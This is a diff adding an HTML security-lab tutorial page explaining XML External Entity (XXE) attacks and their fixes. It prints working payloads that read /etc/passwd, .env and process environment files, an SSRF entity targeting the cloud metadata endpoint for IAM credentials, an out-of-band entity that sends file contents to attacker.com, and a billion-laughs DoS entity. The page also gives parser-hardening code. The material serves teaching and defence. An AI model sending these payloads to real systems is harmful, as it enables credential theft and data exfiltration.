@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>XXE (XML External Entity) — How It Works — BEHACKER</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:#0d0f14;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:0}
+nav{background:#161b22;border-bottom:1px solid #30363d;padding:12px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100}
+.nav-brand{color:#c9d1d9;text-decoration:none;font-weight:700;font-size:1.1rem}
+.nav-back{color:#58a6ff;text-decoration:none;font-size:.9rem}
+.nav-back:hover{text-decoration:underline}
+main{max-width:860px;margin:0 auto;padding:40px 24px 80px}
+h1{font-size:2rem;font-weight:700;color:#e6edf3;margin-bottom:8px}
+.subtitle{color:#8b949e;font-size:.95rem;margin-bottom:40px}
+h2{font-size:1.3rem;font-weight:600;color:#e6edf3;margin:36px 0 12px;padding-bottom:6px;border-bottom:1px solid #30363d}
+h3{font-size:1.1rem;font-weight:600;color:#f8c555;margin:24px 0 10px}
+p{line-height:1.7;margin-bottom:14px;color:#c9d1d9}
+ul,ol{margin:0 0 16px 24px;line-height:1.8}
+li{margin-bottom:4px}
+li strong{color:#e6edf3}
+code{background:#161b22;border:1px solid #30363d;border-radius:4px;padding:2px 6px;font-family:'Courier New',monospace;font-size:.88rem;color:#f8c555}
+pre{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;overflow-x:auto;margin:16px 0 24px}
+pre code{background:none;border:none;padding:0;color:#b5e8a0;font-size:.9rem}
+hr{border:none;border-top:1px solid #30363d;margin:32px 0}
+.back-btn{display:inline-block;margin-top:40px;padding:10px 20px;background:#238636;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:.9rem}
+.back-btn:hover{background:#2ea043}
+strong{color:#e6edf3}
+em{color:#8b949e;font-style:italic}
+</style>
+</head>
+<body>
+<nav>
+  <a href="../../NAVIGATE.html" class="nav-brand">💀 BEHACKER</a>
+  <a href="index.html" class="nav-back">← Back to Lab</a>
+</nav>
+<main>
+<h1>XXE (XML External Entity) — How It Works</h1>
+
+<h2>What is an XML entity?</h2>
+
+<p>Entities are XML shortcuts for reusable strings. Internal entities are safe:</p>
+
+<pre><code class="language-xml">&lt;!DOCTYPE example [ &lt;!ENTITY name "Alice"&gt; ]&gt;
+&lt;greeting&gt;Hello, &amp;name;!&lt;/greeting&gt;
+&lt;!-- renders: Hello, Alice! --&gt;</code></pre>
+
+<p>External entities tell the parser to fetch a value from a URL or file:</p>
+
+<pre><code class="language-xml">&lt;!ENTITY secret SYSTEM "file:///etc/passwd"&gt;</code></pre>
+
+<hr>
+
+<h2>The attack</h2>
+
+<pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE invoice [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;invoice&gt;
+  &lt;note&gt;&amp;xxe;&lt;/note&gt;     ← parser replaces this with the file contents
+&lt;/invoice&gt;</code></pre>
+
+<p>If the server echoes the <code>&lt;note&gt;</code> field back in its response, the file contents appear in the API output.</p>
+
+<hr>
+
+<h2>Attack variants</h2>
+
+<h3>File read</h3>
+<pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY xxe SYSTEM "file:///.env"&gt;
+&lt;!ENTITY xxe SYSTEM "file:///proc/self/environ"&gt;</code></pre>
+
+<h3>SSRF via http entity</h3>
+<pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code></pre>
+<p>The <strong>server</strong> makes the HTTP request — giving access to internal services unreachable from the attacker's machine. The AWS metadata endpoint returns IAM credentials.</p>
+
+<h3>Blind XXE (out-of-band)</h3>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % oob "&lt;!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;</code></pre>
+<p>When the server doesn't echo output, exfiltrate via a DNS/HTTP callback.</p>
+
+<h3>Billion laughs (DoS)</h3>
+<pre><code class="language-xml">&lt;!ENTITY lol  "lol"&gt;
+&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</code></pre>
+<p>10 levels → 10^10 entity expansions → gigabytes of memory consumed.</p>
+
+<hr>
+
+<h2>The Fix</h2>
+
+<pre><code class="language-python"># Python (defusedxml)
+import defusedxml.ElementTree as ET
+tree = ET.parse(xml_file)   # DTD and external entities disabled by default
+
+# Java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+
+# PHP
+libxml_disable_entity_loader(true);   // deprecated in PHP 8 — disabled by default</code></pre>
+
+<p>The safest approach: <strong>disable DTD processing entirely</strong>. If DTDs are needed, disable external entity loading specifically.</p>
+
+<a href="index.html" class="back-btn">← Back to Lab</a>
+</main>
+</body>
+</html>
